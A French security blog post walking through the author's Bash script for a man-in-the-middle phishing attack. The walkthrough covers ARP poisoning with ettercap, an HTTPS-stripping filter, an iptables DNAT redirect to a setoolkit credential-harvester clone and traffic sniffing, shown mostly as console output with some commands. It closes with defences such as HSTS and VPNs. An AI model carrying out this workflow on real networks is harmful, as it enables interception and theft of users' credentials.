---
layout: post
title:  "Phishing d'un site web avec attaque MITM"
date:   2016-09-08
categories: mitm
excerpt_separator: <!--more-->
---
Bonjour à tous,

Je me suis dit qu'il était intéressant de partager avec vous un script **Bash** que j'ai créé pour automatiser une attaque 'Man In The Middle' et rediriger vers une fausse page web que nous allons héberger ([https://github.com/phackt/mitm](https://github.com/phackt/mitm)). L'objectif est pour une attaque ciblée de rendre l'obtention des credentials la plus transparente possible. Cependant il n'existe pas de solution miracle, à chaque combat sa stratégie.  
<!--more-->
  
Ici nous allons donc cibler un site possédant une page d'accueil non sécurisée (HTTP), permettant l'interception en clair des liens HTTPS et de les transformer en liens HTTP classiques. Certains outils comme [sslstrip](https://github.com/moxie0/sslstrip) permettent ce genre d'opérations, en éliminant le caching des pages et en traitant également les headers response **Location** lors des redirections. De notre coté nous utiliserons un simple filtre [ettercap](https://github.com/Ettercap/ettercap) que nous compilerons avec etterfilter.  
  
Pour petit rappel:  

 > L'attaque de l'homme du milieu ou man-in-the-middle attack (MITM) est une attaque qui a pour but d'intercepter les communications entre deux parties, sans que ni l'une ni l'autre ne puisse se douter que le canal de communication entre elles a été compromis.  
  
![Mitm]({{ site.url }}/public/images/mitm-phishing/owasp-man_in_the_middle.jpg)  
Cette attaque se base sur la corruption du cache ARP enregistrant les correspondances @IP <-> @MAC sur un réseau local. Il existe plusieurs outils pour effectuer une [attaque MITM](https://www.information-security.fr/attaque-man-in-the-middle-via-arp-spoofing/) et nous utiliserons Ettercap.  
  
Le site web a été falsifié grâce à l'outil [setoolkit](https://github.com/trustedsec/social-engineer-toolkit) (Social-Engineer Toolkit). Concernant la redirection du domaine, j'ai simplement effectué une règle iptables PREROUTING DNAT au lieu d'effectuer un DNS SPOOFING qui aurait demandé que le cache DNS soit vidé.   
  
Mais venons-en au cas pratique, voici l'exécution du script **phishing.ksh**:  
  
```
-----------------------------------------------
   --==MITM attack with website phishing==--   
-----------------------------------------------

[+] Flushing ip forwarding
[+] Flushing iptables

#HERE SET THE NAME OF THE LOG DIR THAT WILL BE CREATED
Name of 'Session'? (name of the folder that will be created with all the log files): test

#CHOOSE YOUR INTERFACE UP
[+] Discovering interfaces
lo:     state  UNKNOWN
eth0:   state  DOWN
wlan0:  state  UP
Please enter your interface: wlan0

#IF YOU WANNA CHANGE YOUR MAC ADDRESS (http://www.macvendors.com/)
Do you wanna spoof MAC @ ? [yYnN]: n

#TYPE THE DOMAIN THAT WILL BE REDIRECTED TO YOUR WEBSITE
Which domain do you wish to redirect ?: secure.domain.fr

#ASSUMING 192.168.1.99 IS THE MITM MACHINE LOCAL IP WITH APACHE RUNNING
[+] Setting up DNAT iptables rule
iptables -t nat -A PREROUTING -p tcp --dport 80 -d secure.domain.fr -j DNAT --to-destination 192.168.1.99:8080

#IF YOU WANNA RUN SETOOLKIT ( choose options 1) Social-Engineering -> 2) Website Attack Vectors -> 3) Credential Harvester Attack Method )
[+] Setting up website phishing
Do you wanna run setoolkit ? [yYnN]: n

[+] Starting apache2 service

#RUN NETDISCOVER IN ORDER TO ARPING THE SUBNET
[+] Net discovering
Do you wanna netdiscovering ? [yYnN]: y
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.1.1     01:12:23:34:45:56      1      42  Gateway
 192.168.1.100   12:23:34:45:56:67      2      84  Apple Macbook Pro

-- Active scan completed, 1 Hosts found.


[+] Routing information
Table de routage IP du noyau
Destination     Passerelle      Genmask         Indic Metric Ref    Use Iface
0.0.0.0         192.168.1.1     0.0.0.0         UG    600    0        0 wlan0
192.168.1.0     0.0.0.0         255.255.255.0   U     600    0        0 wlan0

#CHOOSE THE VICTIM
Enter target1 ip: 192.168.1.11
#CHOOSE THE SECOND MACHINE (DEFAULT IS GATEWAY)
Enter target2 ip [press enter for default gateway 192.168.1.1]: 

#LAUNCHING ETTERCAP WITH THE HTTPS STRIP ETTERCAP FILTER (https_strip.ef)
[+] Running MITM attack...

#IF YOU NEED TO LEGITIMATE AN ARP REPLY (IF GATEWAY IS A PRETENTIOUS YOUNG MADAM)
/!\ Please check poisoning is OK by typing 'P', then 'chk_poison'
Command for protected gateway: 
dhcping -c 192.168.1.100 -h 12:23:34:45:56:67 -s 192.168.1.1 -r -v

#SNIFFING HTTP REQUESTS
[+] Starting GET/POST logging...
urlsnarf: listening on wlan0 [tcp port 80 or port 8080 or port 3128]

#TAILING PHISHING WEBSITE HARVESTER FILE
[+] Looking for credentials...

[+] IMPORTANT...
After the job please close this script and clean up properly by hitting 'qQ'
```

Les outils MITM peuvent également forger dynamiquement un certificat pour interception des connexions TLS/SSL. Cependant ce dernier n'étant pas signé par une autorité de certification vérifiée, un warning dans votre navigateur affichera que le certificat est non valide (assez discret sous Safari cependant).  

![Certificat]({{ site.url }}/public/images/mitm-phishing/alerte-certificat.png)  

 > <span style="color: red">Cliquez sur 'Back to safety'</span>
  
Dans notre exemple, la connexion au site falsifié est non sécurisée (évitant les alertes de certificats). Donc vérifier toujours le cadenas vert dans la barre d'url et que votre connexion soit sécurisée.  
  
Dans le cas d'une autorité de certification compromise le pinning de clé publique pourrait avoir son utilité même si le HPKP devient obsolète et ne sera plus supporté sous Chrome au bénéfice du 'Certificate Transparency'. Nous voyons aussi l'importance du HSTS (Strict-Transport-Security) abordé dans les [précédents articles]({{ site.url }}/xss-cors-csrf-partie-3-cors-csrf#hsts) pour forcer les connexions HTTPS. Certains firewall (ex [Symantec](https://www.symantec.com/security_response/glossary/define.jsp?letter=a&word=anti-mac-spoofing)) empêchent les ARP Reply non légitimes.  
  
L'autre solution la plus couramment utilisée reste le cloisonnement en VLAN. Si vous vous connectez à un HotSpot, établir un canal chiffré (ex VPN) est également une idée.  
  
A bientôt.
<br />
<br />
Références :  
[https://www.owasp.org/index.php/Man-in-the-middle_attack](https://www.owasp.org/index.php/Man-in-the-middle_attack)  
[https://www.information-security.fr/attaque-man-in-the-middle-via-arp-spoofing/](https://www.owasp.org/index.php/Man-in-the-middle_attack)
